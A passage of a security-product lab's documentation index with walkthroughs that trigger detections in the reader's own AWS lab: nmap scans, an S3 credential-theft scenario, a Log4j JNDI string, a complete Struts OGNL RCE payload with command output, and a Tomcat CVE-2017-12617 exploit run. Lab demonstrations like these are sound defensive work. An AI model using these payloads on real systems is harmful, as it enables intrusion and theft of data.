OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n25/tcp   closed smtp\n53/tcp   closed domain\n80/tcp   closed http\n110/tcp  closed pop3\n113/tcp  closed ident\n143/tcp  closed imap\n443/tcp  closed https\n993/tcp  closed imaps\n1521/tcp closed oracle\n3306/tcp closed mysql\n5560/tcp closed isqlplus\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap scan report for linuxweb (10.0.4.145)\nHost is up (0.000093s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Welcome to nginx!\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap scan report for 10.0.4.192\nHost is up (0.00081s latency).\nNot shown: 995 filtered ports\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: ADFS\n|   NetBIOS_Domain_Name: ADFS\n|   NetBIOS_Computer_Name: PGO-CA\n|   DNS_Domain_Name: pgo-id.local\n|   DNS_Computer_Name: PGO-CA.pgo-id.local\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-07-30T14:53:04+00:00\n| ssl-cert: Subject: commonName=PGO-CA.pgo-id.local\n| Not valid before: 2024-07-29T11:08:41\n|_Not valid after:  2025-01-28T11:08:41\n|_ssl-date: 2024-07-30T14:53:44+00:00; 0s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: PGO-CA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5b:ce:db:4e:69 (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2024-07-30T14:53:04\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 512 IP addresses (3 hosts up) scanned in 64.22 seconds\n</code></pre> <p>Head over to XDR Threat Investigation -&gt; Observed Attack Techniques.</p> <p>Set the Risk Level to include <code>Medium</code> and Datasource to <code>Network -&gt; Network Sensor</code>. The following detection should pop up:</p> <p></p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor/","title":"Scenario: Deploying Virtual Network Sensor on AWS","text":"<p>NOT FINISHED YET</p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor/#traffic-mirror-on-aws","title":"Traffic Mirror on AWS","text":"<p>In an on-premises environment, you would connect the data port of a Deep Discovery Inspector to a single mirror port to capture all traffic on that switch.</p> <p>In AWS, you can achieve similar functionality to a switch mirror port by using Traffic Mirroring on Elastic Network Interfaces (ENIs). This feature allows you to capture and inspect network traffic by mirroring it to another interface running monitoring software, such as our Inspector. However, unlike physical switches, in AWS you must explicitly configure traffic mirroring for each ENI you want to monitor.</p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> <li>Activated Marketplace AMI for Trend Virtual Network Sensor BYOL</li> </ul> <p>You need to have activated the Trend Virtual Network Sensor BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Virtual Network Sensor</code>.</p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have <code>VNS - create Virtual Network Sensor</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVNS - create Virtual Network Sensor? [true]: \nVNS - Virtual Network Sensor Token [eyJhbGciOi]: \n...\n</code></pre> <p>Ensure to have the Playground One Network and Linux Instances up and running:</p> <pre><code># Network configuration\npgo --apply network\n\n# Instances configuration\npgo --apply instances\n</code></pre>"},{"location":"scenarios/network-security/v1-virtual-network-sensor/#test-it","title":"Test It","text":"<p>Connect to the <code>linux_web</code> instance</p> <pre><code>pgo -o instances\n __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\nUsing PDO User Access Key ID: ...S7CH\nConfiguration instances in directory /home/markus/projects/opensource/playground/playground-one/awsone/3-instances\ninstance_ip_linux_db = \"18.194.28.64\"\ninstance_ip_linux_web = \"18.185.107.182\"\ninstance_username_linux_server = \"ubuntu\"\ns3_bucket = \"pgo-id-bucket-vkdhir40\"\nssh_instance_linux_db = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.194.28.64\"\nssh_instance_linux_web = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.185.107.182\"\n``\u00b4\n\n```sh\nssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.185.107.182\n</code></pre> <p>Now install <code>nmap</code> to trigger a simple detection with our Virtual Network Sensor.</p> <pre><code>sudo apt update\nsudo apt install -y nmap\n</code></pre> <p>Scan the subnet</p> <pre><code>nmap 10.0.4.0/24\n</code></pre> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-25 11:15 UTC\nNmap scan report for ip-10-0-4-13.eu-central-1.compute.internal (10.0.4.13)\nHost is up (0.000074s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap scan report for ip-10-0-4-57.eu-central-1.compute.internal (10.0.4.57)\nHost is up (0.00040s latency).\nNot shown: 986 filtered ports\nPORT     STATE  SERVICE\n20/tcp   closed ftp-data\n21/tcp   closed ftp\n22/tcp   open   ssh\n25/tcp   closed smtp\n53/tcp   closed domain\n80/tcp   closed http\n110/tcp  closed pop3\n113/tcp  closed ident\n143/tcp  closed imap\n443/tcp  closed https\n993/tcp  closed imaps\n1521/tcp closed oracle\n3306/tcp closed mysql\n5560/tcp closed isqlplus\n\nNmap done: 256 IP addresses (2 hosts up) scanned in 7.67 seconds\n</code></pre> <pre><code>nmap -T4 -A -v 10.0.4.0/24\n</code></pre> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 14:52 UTC\nNmap scan report for 10.0.4.91\nHost is up (0.00026s latency).\nNot shown: 986 filtered ports\nPORT     STATE  SERVICE  VERSION\n20/tcp   closed ftp-data\n21/tcp   closed ftp\n22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n25/tcp   closed smtp\n53/tcp   closed domain\n80/tcp   closed http\n110/tcp  closed pop3\n113/tcp  closed ident\n143/tcp  closed imap\n443/tcp  closed https\n993/tcp  closed imaps\n1521/tcp closed oracle\n3306/tcp closed mysql\n5560/tcp closed isqlplus\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap scan report for linuxweb (10.0.4.145)\nHost is up (0.000093s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Welcome to nginx!\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap scan report for 10.0.4.192\nHost is up (0.00081s latency).\nNot shown: 995 filtered ports\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: ADFS\n|   NetBIOS_Domain_Name: ADFS\n|   NetBIOS_Computer_Name: PGO-CA\n|   DNS_Domain_Name: pgo-id.local\n|   DNS_Computer_Name: PGO-CA.pgo-id.local\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-07-30T14:53:04+00:00\n| ssl-cert: Subject: commonName=PGO-CA.pgo-id.local\n| Not valid before: 2024-07-29T11:08:41\n|_Not valid after:  2025-01-28T11:08:41\n|_ssl-date: 2024-07-30T14:53:44+00:00; 0s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: PGO-CA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5b:ce:db:4e:69 (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2024-07-30T14:53:04\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 512 IP addresses (3 hosts up) scanned in 64.22 seconds\n</code></pre> <p>Head over to XDR Threat Investigation -&gt; Observed Attack Techniques.</p> <p>Set the Risk Level to include <code>Medium</code> and Datasource to <code>Network -&gt; Network Sensor</code>. The following detection should pop up:</p> <p></p>"},{"location":"scenarios/xdr/cloudtrail/","title":"Scenario: CloudTrail","text":""},{"location":"scenarios/xdr/cloudtrail/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> </ul> <p>Ensure to have the Playground One Network up and running:</p> <pre><code># Network configuration\npgo --apply network\n</code></pre>"},{"location":"scenarios/xdr/cloudtrail/#overview","title":"Overview","text":"<p>Automated malicious actions are executed on running this scenario which lead to detections in Observed Attack Techniques and the generation of Workbenches.</p>"},{"location":"scenarios/xdr/cloudtrail/#the-story","title":"The story","text":"<p>Using a leaked user with S3 access allows the attacker to list all the buckets and look for buckets where possible sensitive information is stored.</p>"},{"location":"scenarios/xdr/cloudtrail/#what-is-going-to-happen","title":"What is going to happen?","text":"<p>This demo is executing the following actions:</p> <ol> <li>Preparation</li> <li>Create a S3 Bucket and upload a <code>password.zip</code>.</li> <li>Create an IAM User with <code>S3FullAccess</code> policy.</li> <li>Create an EC2 instance acting as the final target.</li> <li>Attack (using the created user)</li> <li>Create a <code>download</code> directory.</li> <li>Iterate through each bucket (filtered on PGO environment name).</li> <li>List bucket objects.</li> <li>Download bucket object if key matches <code>password.zip</code> and <code>*.pem</code>.</li> <li>Access EC2 instance with downloaded key and query instance role.</li> <li>Clean up</li> <li>Destroy bucket, instance, and user.</li> </ol> <p>Screenshot of generated OATs:</p> <p></p>"},{"location":"scenarios/xdr/cloudtrail/#run-the-attack","title":"Run the Attack","text":"<p>So, this is very simple :-)</p> <pre><code># Create the user, search buckets, download credentials\npgo --apply scenarios-cloudtrail\n</code></pre> <pre><code>Outputs:\n\naccess_key = \"AKIAZHO3CC62YYHHCD6N\"\nattack = tomap({\n  \"instance_role\" = \"pgo-id-ec2-role-24yi5egt\"\n})\nattacker_arn = \"arn:aws:iam::634503960501:user/pgo-id-attacker-ragfl318\"\ninstance_ip_linux = \"35.158.122.99\"\ns3_bucket = \"pgo-id-scenarios-wk3gd608\"\nsecret_key = &lt;sensitive&gt;\n</code></pre> <p><code>pgo-id-ec2-role-24yi5egt</code> is the role name of the target instance to which the attacker gained access after finding and downloading the ssh key from S3. He connected to the instance and queried it's metadata.</p> <pre><code># Delete the user again\npgo --destroy scenarios-cloudtrail\n</code></pre> <p>Review the detections in Vision One.</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr/detection-model-exceptions/","title":"Scenario: Detection Model Exceptions for Container Security","text":"<p>This scenario can be useful, if you don't want to use namespace exclusions in Container Security but don't want OATs/Workbenches generated for known as-designed behavior. In this example we're dealing with two exceptions for privileged containers created by Calico and Istio.</p> <p>Without namespace exclusions the deployment of Calico and Istio would generate a couple of OATs in Vision One:</p> <p> </p> <p>Here, we're going to set exceptions for these detections.</p>"},{"location":"scenarios/xdr/detection-model-exceptions/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2</li> <li>Vision One Container Security</li> </ul> <p>Verify, that you have <code>Deploy Calico</code> and <code>Deploy Istio</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nSection: Kubernetes Deployments\nPlease set/update your Integrations configuration\n...\nDeploy Calico? [true]:\n...\nDeploy Istio? [true]:\n...\n</code></pre>"},{"location":"scenarios/xdr/detection-model-exceptions/#container-security","title":"Container Security","text":""},{"location":"scenarios/xdr/detection-model-exceptions/#deploy-policy","title":"Deploy Policy","text":"<p>Generally, one does not want to run privileged containers, but there might be some reasons for them. So below we're configuring a policy which blocks containers with extended privileges but allows them in two dedicated namespaces:</p> <p>Below, the upper parts of the deployment policy:</p> <p></p> <p></p> <p></p>"},{"location":"scenarios/xdr/detection-model-exceptions/#runtime-rules","title":"Runtime Rules","text":"<p>The runtime rules assigned to the policy do have rule <code>TM-00000031</code> assigned:</p> <p></p> <p></p>"},{"location":"scenarios/xdr/detection-model-exceptions/#detection-model-management","title":"Detection Model Management","text":""},{"location":"scenarios/xdr/detection-model-exceptions/#detection-model-exception-for-calico","title":"Detection Model Exception for Calico","text":"<p>Calico creates violations against the runtime rule <code>TM-00000031</code> by several containers. This is by design and can be excluded.</p> <p>Example on <code>calico-csi</code>:</p> <p></p> <p>This allows us to create an exception.</p> <ul> <li>Targets<ul> <li>Field: <code>ALL</code></li> </ul> </li> <li>Event Source<ul> <li>Event type: <code>ALL</code></li> </ul> </li> <li>Match Criteria<ul> <li>Field type: <code>detection_name</code></li> <li>Field: <code>ruleName</code></li> <li>Values: <code>.*Launch Privileged Container</code></li> <li>Edit using wildcards: Checked</li> </ul> </li> <li>AND<ul> <li>Field type: <code>container_identifier</code></li> <li>Field: <code>k8sNamespace</code></li> <li>Values: <code>calico-system</code></li> </ul> </li> <li>AND<ul> <li>Field type: <code>container_identifier</code></li> <li>Field: <code>containerName</code></li> <li>Values: <code>calico-csi</code>, <code>flexvol-driver</code>, <code>csi-node-driver-registrar</code>, <code>calico-node</code></li> </ul> </li> </ul> <p>The resulting exception should look like this:</p> <p></p>"},{"location":"scenarios/xdr/detection-model-exceptions/#detection-model-exception-for-istio","title":"Detection Model Exception for Istio","text":"<p>The deployment of Istio contains a CNI which runs as a privileged pod. This is by design and can be excluded with the exception below:</p> <p></p>"},{"location":"scenarios/xdr/detection-model-exceptions/#deploy-the-eks-cluster","title":"Deploy the EKS Cluster","text":"<p>Create the PGO EKS-EC2 cluster by running</p> <pre><code>pgo --apply eks-ec2\n</code></pre>"},{"location":"scenarios/xdr/detection-model-exceptions/#verification","title":"Verification","text":"<p>Amongst other namespaces you should have a couple of pods running inside the Calico and Istio namespaces:</p> <pre><code>kubectl get pods -A\n</code></pre> <pre><code>NAMESPACE           NAME                                                         READY   STATUS    RESTARTS      AGE\ncalico-apiserver    calico-apiserver-546b9bf5dd-2f4pw                            1/1     Running   0             10m\ncalico-apiserver    calico-apiserver-546b9bf5dd-r249x                            1/1     Running   0             17m\ncalico-system       calico-kube-controllers-5cf8f69bdb-q47qt                     1/1     Running   0             10m\ncalico-system       calico-node-ltj46                                            1/1     Running   0             16m\ncalico-system       calico-node-qt52v                                            1/1     Running   0             18m\ncalico-system       calico-node-tp6mv                                            1/1     Running   0             10m\ncalico-system       calico-typha-59b58f479b-gwblv                                1/1     Running   0             10m\ncalico-system       calico-typha-59b58f479b-jp9mv                                1/1     Running   0             16m\ncalico-system       csi-node-driver-64tsw                                        2/2     Running   0             9m56s\ncalico-system       csi-node-driver-gzj9d                                        2/2     Running   0             18m\ncalico-system       csi-node-driver-w264r                                        2/2     Running   0             16m\nistio-system        istio-cni-node-6xxlt                                         1/1     Running   0             16m\nistio-system        istio-cni-node-96qpv                                         1/1     Running   0             10m\nistio-system        istio-cni-node-kc98b                                         1/1     Running   0             18m\nistio-system        istio-ingressgateway-9cc99c9db-g7qc4                         1/1     Running   0             10m\nistio-system        istiod-68659fc5b5-trvn9                                      1/1     Running   0             19m\n</code></pre> <p>This proves, that Calico and Istio are up including their <code>cni</code> nodes.</p> <p>Head over to <code>XDR Threat Investigation -&gt; Observed Attack Techniques</code> and verify, that there are no OATs listed in regards Privileged Containers.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr/oat-generation/","title":"Scenario: Automated Observed Attack Techniques Generation","text":""},{"location":"scenarios/xdr/oat-generation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 or Fargate Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 or Fargate Cluster including the Scenarios up and running:</p> <pre><code># EC2 only\npgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>or</p> <pre><code># Fargate\npgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/xdr/oat-generation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr/oat-generation/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security Observed Attack Techniques and the generation of Workbenches.</p>"},{"location":"scenarios/xdr/oat-generation/#the-story","title":"The story","text":"<p>Several attack techniques will be detected after the deployment depending on your Container Security Runtime Policy. For full coverage enable all rules and set them to <code>Log</code>.</p> <p>Since the attacks are executed every full hour there is no need to scroll through the detections.</p> <p>Screenshot of generated OATs:</p> <p></p>"},{"location":"scenarios/xdr/oat-generation/#goals","title":"Goals","text":"<p>Review the detections in Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr/workbench-generation/","title":"Scenario: Automated Workbench Generation","text":""},{"location":"scenarios/xdr/workbench-generation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 or Fargate Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 or Fargate Cluster including the Scenarios up and running:</p> <pre><code># EC2 only\npgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>or</p> <pre><code># Fargate\npgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/xdr/workbench-generation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr/workbench-generation/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security. This scenario is very similar to the OAT Generation, but focuses on generated Workbenches.</p>"},{"location":"scenarios/xdr/workbench-generation/#the-story","title":"The story","text":"<p>Several attack techniques will be detected after the deployment depending on your Container Security Runtime Policy. For full coverage enable all rules and set them to <code>Log</code>.</p> <p>Since the attacks are executed every full hour there is no need to scroll through the generated Workbenches.</p> <p>Screenshot of generated Workbenches:</p> <p></p> <p>The first Workbench is mostly because of using Terraform creating the environment. Since this happens obviously bb</p> <p>A simple but good demo Workbench is the <code>Compile Source File Code After Delivery in Container</code>.</p> <p></p> <p>Here, a <code>.c</code> file is dropped into the container which is then compiled by <code>gcc</code>.</p>"},{"location":"scenarios/xdr/workbench-generation/#goals","title":"Goals","text":"<p>Review the detections in Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/xdr4c/ecs-log4j/","title":"Scenario: Detect JNDI Injection in HTTP Request (Log4j)","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-log4j/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#exploit","title":"Exploit","text":"<p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>${jndi:ldap://host.docker.internal:9999/Commons2}</code></li> <li>Password: <code>does not matter</code></li> </ul> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Note: The currently deployed app is not vulnerable for Log4j, the technique from above still triggers the exploitation attempt.</p>"},{"location":"scenarios/xdr4c/ecs-struts/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-struts/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/","title":"Scenario: Detect Tomcat RCE","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#checking-if-app-server-is-vulnerable","title":"Checking if app server is vulnerable","text":"<p>Now you can check to see if the tomcat server is vulnerable. If it is you should see something similar to the following:</p> <pre><code>cd ${ONEPATH}/exploits/tomcat-rce/\npython3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n\n\n[@intx0x80]\n\n\nPoc Filename  Poc.jsp\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com it's Vulnerable to CVE-2017-12617\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp\n</code></pre> <p>If you point a browser at http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp you should get a test page with a bunch of \"A\" char's - that shows the exploit worked.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#inject-the-exploit-and-run-commands-in-the-container-from-browser","title":"Inject the exploit and run commands in the container from browser","text":"<p>Next, inject the exploit and just hit <code>ENTER</code> at the shell prompt that comes up. (Ignore the error afterward)</p> <pre><code>python3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com -p pwn\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / 